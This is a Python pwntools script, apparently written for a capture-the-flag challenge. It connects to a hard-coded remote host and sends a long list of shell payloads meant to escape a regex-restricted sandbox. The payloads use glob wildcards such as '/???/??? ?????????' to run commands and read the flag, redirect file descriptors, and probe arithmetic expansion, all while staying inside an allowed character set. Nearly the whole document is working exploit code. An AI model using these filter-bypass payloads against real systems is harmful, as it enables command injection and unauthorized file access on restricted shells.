from pwn import remote, time
import sys

# Config
HOST = "94.237.123.126"
PORT = 34445

ALLOWED_CHARS = "0123456789${}/?\"[:space:]:&>_=()" # Based on the regex analysis

def connect_to_service(host, port):
    """Connects to the remote service."""
    try:
        conn = remote(host, port)
        print(f"[+] Connected to {host}:{port}")
        return conn
    except Exception as e:
        print(f"[-] Error connecting to {host}:{port}: {e}")
        return None

def send_payload(conn, payload):
    """Sends a single payload and returns the response."""
    try:
        print(f"\n[+] Sending payload: {repr(payload)}")
        conn.sendline(payload.encode())
        # Increased timeout to allow for potentially longer execution times
        response = conn.recv(timeout=10).decode(errors='ignore')
        if response:
            print("[*] Response:")
            print(response)
        else:
            print("[!] No response received")
        return response
    except Exception as e:
        print(f"[-] Error sending payload or receiving response: {e}")
        return None

def main():
    """Main function to run the sandbox buster."""
    conn = connect_to_service(HOST, PORT)
    if not conn:
        sys.exit(1)

    try:
        # Print initial banner
        print("[+] Initial response:")
        initial_response = conn.recv().decode(errors='ignore')
        print(initial_response)

        # Try redirecting file descriptor 5 immediately
        send_payload(conn, "5>&1")
        send_payload(conn, "5>&2")

        # --- Payload Generation and Testing Logic Goes Here ---
        # This will be implemented iteratively based on analysis

        # Example: Sending a few initial test payloads
        test_payloads = [
            "$((3-2))", # Test arithmetic result 1
            "$((4/4))", # Test arithmetic result 1
            "/???/??? ????????? >&5", # Send flag to FD 5
            "$((1+1))", # Trigger awk to read from FD 5
            "/???/?????????????????/???????????????????? >&1", # Payload to list files in /home/restricted_user/
            "/???/?????????????????/????????? >&1",
            "/???/?????????????????/????????? >&1",
            "/???/?????????????????/???????????????.?? >&1",
            "/???/??? ????????? >&1",
            "/?",
            "?",
            "$(/???/??? ?????????)",
            "$((1+1))",
            "$(echo $?) & $(echo $$)",
            "1>&2",
            "5>&1",
            "5>&2",
            "3>&1",
            "3>&2",
            "4>&1",
            "4>&2",
            "6>&1",
            "7>&1",
            "8>&1",
            "9>&1",
            "10>&1",
            "$((2*2))",
            " $((2+2))", # Leading space
            "$((3+3))",
            "$((4-1))",
            "$((6/3))",
            "$((5*5))",
            "1>&1",
            "2>&1",
            "2>&2",
            "&>1",
            "&>2",
            "0>&2",
            "3>&3",
            "4>&4",
            "5>&5",
            "6>&6",
            "7>&7",
            "8>&8",
            "9>&9",
            "10>&10",
            "$((1+0))",
            "$((2-1))",
            "$((1*1))",
            "$((2/2))",
            "$((3-1))",
            "$((2*1))",
            "$((4/2))",
            "$((10+20))",
            "$((99-50))",
        ]

        for payload in test_payloads:
            send_payload(conn, payload)

        # ----------------------------------------------------

    except Exception as e:
        print("[-] Error during payload execution:", e)
    finally:
        conn.close()
        print("\n[+] Connection closed.")
    print("\n[+] Done!")

if __name__ == "__main__":
    main()
